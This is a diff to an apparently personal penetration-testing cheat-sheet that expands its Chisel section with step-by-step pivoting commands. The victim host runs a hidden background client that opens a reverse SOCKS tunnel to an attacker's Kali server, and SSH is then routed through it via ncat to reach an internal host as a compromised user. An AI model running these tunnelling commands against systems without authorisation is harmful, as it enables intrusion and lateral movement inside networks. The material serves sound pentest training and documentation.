@@ -2,13 +2,26 @@
 
 ## Chisel
 
+Run a Chisel server on Kali:
 ```
-chiselkali$ chisel server --port 8080 --reverse
-chiselkali$ sudo tcpdump -nvvvXi ensXpY tcp port 8080
-victim$ chisel client $IpChiselKali:8080 R:socks > /dev/null 2>&1 &
-chiselkali$ ss -lntpu # check port
-ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:$portchecked %h %p' userwithpass@hostwithservice
-yes
+chiselkali$ chisel server --port $KaliPort --reverse
+```
+then monitor the traffic in case it doesn't work:
+```
+chiselkali$ sudo tcpdump -nvvvXi $SomeInterface tcp port $KaliPort
+```
+Send the Chiser client to the target and execute it:
+```
+victim$ chisel client $IpChiselKali:$KaliPort R:socks > /dev/null 2>&1 &
+```
+Check the opened port on Kali to reuse it:
+```
+chiselkali$ ss -lntpu # check port for the Socks proxy
+```
+and use the port to send Socks command (`nc` doesn't support proxying, instead run `ncat`):
+```
+kali$ sudo apt-get install ncat
+kali$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:$PortCheckedWithSs %h %p' hackeduser@$IpDbIn
 ```
 
 ## DNS
